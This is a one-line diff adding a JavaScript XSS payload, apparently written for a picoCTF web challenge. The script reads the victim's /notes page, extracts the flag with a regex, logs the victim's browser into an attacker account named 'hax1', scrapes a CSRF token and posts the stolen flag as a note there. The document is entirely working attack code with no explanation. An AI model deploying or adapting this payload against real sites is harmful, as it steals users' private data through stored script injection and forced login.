@@ -1,0 +1,1 @@
+<script>fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){fetch('/login',{method:'POST',body:new URLSearchParams({username:'hax1',password:'hax1'})}).then(()=>fetch('/new').then(r=>r.text()).then(t=>{fetch('/new',{method:'POST',body:new URLSearchParams({_csrf:t.match(/name="_csrf" value="([^"]+)"/)[1],title:'F',content:m[0]})})}))}})</script>
